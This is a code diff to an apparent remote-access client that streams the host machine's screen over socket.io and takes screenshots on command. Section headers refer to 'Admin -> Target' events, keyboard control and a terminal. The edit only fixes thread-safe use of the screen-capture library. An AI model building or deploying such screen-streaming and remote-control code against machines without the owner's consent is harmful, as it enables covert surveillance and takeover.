@@ -91,31 +91,32 @@ class KeyboardController:
 # ============================================================
 #  Capture Loops
 # ============================================================
-def get_screen():
-    monitor = sct.monitors[current_monitor]
-    raw_img = sct.grab(monitor)
+def get_screen(local_sct):
+    monitor = local_sct.monitors[current_monitor]
+    raw_img = local_sct.grab(monitor)
     img = Image.frombytes("RGB", raw_img.size, raw_img.rgb)
     return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
 
 def screen_capture_loop():
     global screen_size, is_capturing
-    screen_size = sct.monitors[current_monitor]
-    while is_capturing:
-        try:
-            frame = get_screen()
-            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
-            result, encimg = cv2.imencode('.jpg', frame, encode_param)
-            if result:
-                sio.emit('screen_frame', {
-                    'image': base64.b64encode(encimg).decode('utf-8'),
-                    'width': screen_size['width'],
-                    'height': screen_size['height'],
-                    'timestamp': time.time()
-                })
-            time.sleep(1/30)
-        except Exception as e:
-            print(f"Capture error: {e}")
-            time.sleep(0.1)
+    with mss.mss() as local_sct:
+        screen_size = local_sct.monitors[current_monitor]
+        while is_capturing:
+            try:
+                frame = get_screen(local_sct)
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
+                result, encimg = cv2.imencode('.jpg', frame, encode_param)
+                if result:
+                    sio.emit('screen_frame', {
+                        'image': base64.b64encode(encimg).decode('utf-8'),
+                        'width': screen_size['width'],
+                        'height': screen_size['height'],
+                        'timestamp': time.time()
+                    })
+                time.sleep(1/30)
+            except Exception as e:
+                print(f"Capture error: {e}")
+                time.sleep(0.1)
 
 # ============================================================
 #  Incoming Server Events (Admin -> Target)
@@ -163,9 +164,10 @@ def on_keyboard(data):
 @sio.on('system')
 def on_system(data):
     if data['cmd'] == 'screenshot':
-        frame = get_screen()
-        _, buffer = cv2.imencode('.png', frame)
-        sio.emit('screenshot', {'image': base64.b64encode(buffer).decode()})
+        with mss.mss() as local_sct:
+            frame = get_screen(local_sct)
+            _, buffer = cv2.imencode('.png', frame)
+            sio.emit('screenshot', {'image': base64.b64encode(buffer).decode()})
 
 # --- Terminal ---
 @sio.on('terminal_start')
